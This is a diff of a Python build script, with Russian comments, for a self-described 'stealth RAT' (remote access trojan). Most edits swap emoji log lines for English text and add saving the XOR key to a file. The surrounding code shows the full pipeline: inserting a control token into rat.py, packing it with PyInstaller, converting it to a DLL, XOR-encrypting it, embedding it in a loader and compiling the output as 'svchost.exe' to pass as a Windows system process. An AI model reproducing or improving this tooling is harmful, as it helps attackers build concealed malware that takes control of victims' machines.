@@ -1,4 +1,4 @@
-# build.py - Сборка EXE с зашифрованной DLL
+# build.py - Сборка EXE с зашифрованной DLL (БЕЗ ЭМОДЗИ)
 import os
 import sys
 import subprocess
@@ -16,7 +16,7 @@ class StealthBuilder:
         
     def build_exe_with_pyinstaller(self):
         """Собирает обычный EXE с PyInstaller (со всем Python внутри)"""
-        print("🔨 Собираю EXE через PyInstaller...")
+        print("[+] Building EXE with PyInstaller...")
         
         # Сначала собираем обычный EXE (как ты делал)
         cmd = [
@@ -49,7 +49,7 @@ class StealthBuilder:
         
         result = subprocess.run(cmd, capture_output=True)
         if result.returncode != 0:
-            print(f"❌ Ошибка PyInstaller: {result.stderr.decode()}")
+            print(f"[-] PyInstaller error: {result.stderr.decode()}")
             return None
             
         # Проверяем что файл создался
@@ -62,17 +62,18 @@ class StealthBuilder:
                     break
         
         if not os.path.exists(exe_path):
-            print("❌ EXE не найден!")
+            print("[-] EXE not found!")
             return None
             
         # Переименовываем в payload.exe
         shutil.copy(exe_path, "payload.exe")
-        print(f"✅ EXE готов! Размер: {os.path.getsize('payload.exe') / (1024*1024):.1f} MB")
+        size_mb = os.path.getsize('payload.exe') / (1024*1024)
+        print(f"[+] EXE ready! Size: {size_mb:.1f} MB")
         return "payload.exe"
     
     def convert_exe_to_dll(self, exe_path):
         """Конвертирует EXE в DLL (обертка)"""
-        print("🔄 Конвертирую EXE в DLL...")
+        print("[+] Converting EXE to DLL...")
         
         # Читаем EXE
         with open(exe_path, 'rb') as f:
@@ -145,15 +146,16 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         
         result = subprocess.run(cmd, capture_output=True)
         if result.returncode != 0:
-            print(f"❌ Ошибка компиляции DLL: {result.stderr.decode()}")
+            print(f"[-] DLL compilation error: {result.stderr.decode()}")
             return None
             
-        print(f"✅ DLL готова! Размер: {os.path.getsize('payload.dll') / (1024*1024):.1f} MB")
+        size_mb = os.path.getsize('payload.dll') / (1024*1024)
+        print(f"[+] DLL ready! Size: {size_mb:.1f} MB")
         return "payload.dll"
     
     def encrypt_dll(self, dll_path):
         """Шифрует DLL"""
-        print("🔐 Шифрую DLL...")
+        print("[+] Encrypting DLL...")
         
         with open(dll_path, 'rb') as f:
             dll_data = f.read()
@@ -166,7 +168,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         for i in range(len(encrypted)):
             encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
         
-        print(f"✅ Зашифровано! Размер: {len(encrypted) / (1024*1024):.1f} MB")
+        size_mb = len(encrypted) / (1024*1024)
+        print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
         return encrypted
     
     def bytes_to_c_array(self, data, name):
@@ -183,7 +186,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     
     def build_loader(self, encrypted_dll):
         """Собирает финальный загрузчик"""
-        print("🔧 Собираю загрузчик...")
+        print("[+] Building loader...")
         
         with open('loader.cpp', 'r') as f:
             loader = f.read()
@@ -209,12 +212,12 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         with open('loader_final.cpp', 'w') as f:
             f.write(loader)
         
-        print("✅ Загрузчик готов!")
+        print("[+] Loader ready!")
         return 'loader_final.cpp'
     
     def compile_loader(self, loader_path):
         """Компилирует загрузчик в EXE"""
-        print("🔨 Компилирую финальный EXE...")
+        print("[+] Compiling final EXE...")
         
         cmd = [
             'g++',
@@ -229,20 +232,20 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         
         result = subprocess.run(cmd, capture_output=True)
         if result.returncode != 0:
-            print(f"❌ Ошибка: {result.stderr.decode()}")
+            print(f"[-] Error: {result.stderr.decode()}")
             return None
         
-        size = os.path.getsize('svchost.exe')
-        print(f"✅ ФИНАЛЬНЫЙ EXE готов! Размер: {size / 1024:.1f} KB")
+        size_kb = os.path.getsize('svchost.exe') / 1024
+        print(f"[+] FINAL EXE ready! Size: {size_kb:.1f} KB")
         return 'svchost.exe'
     
     def build(self):
         """Полный процесс сборки"""
-        print("🚀 НАЧИНАЮ СБОРКУ STEALTH RAT")
+        print("[+] STARTING STEALTH RAT BUILD")
         print("=" * 60)
         
         # 1. Обновляем rat.py с токеном
-        print("📝 Обновляю rat.py...")
+        print("[+] Updating rat.py...")
         with open('rat.py', 'r', encoding='utf-8') as f:
             content = f.read()
         content = content.replace('{{TOKEN}}', self.token)
@@ -271,18 +274,23 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         
         if final_exe:
             print("=" * 60)
-            print("🎉 СБОРКА ЗАВЕРШЕНА УСПЕШНО!")
-            print(f"📦 ФИНАЛЬНЫЙ EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
-            print(f"📁 Исходный EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
-            print(f"📁 DLL: {dll} ({os.path.getsize(dll) / (1024*1024):.1f} MB)")
-            print(f"🔑 Ключ: {self.xor_key.hex()}")
+            print("[+] BUILD COMPLETED SUCCESSFULLY!")
+            print(f"[+] FINAL EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
+            print(f"[+] Original EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
+            print(f"[+] DLL: {dll} ({os.path.getsize(dll) / (1024*1024):.1f} MB)")
+            print(f"[+] Key: {self.xor_key.hex()}")
+            
+            # Сохраняем ключ в файл
+            with open('key.txt', 'w') as f:
+                f.write(self.xor_key.hex())
+            
             return True
         
         return False
 
 if __name__ == "__main__":
     if len(sys.argv) < 3:
-        print("Использование: python build.py TOKEN ADMIN_ID")
+        print("Usage: python build.py TOKEN ADMIN_ID")
         sys.exit(1)
     
     token = sys.argv[1]
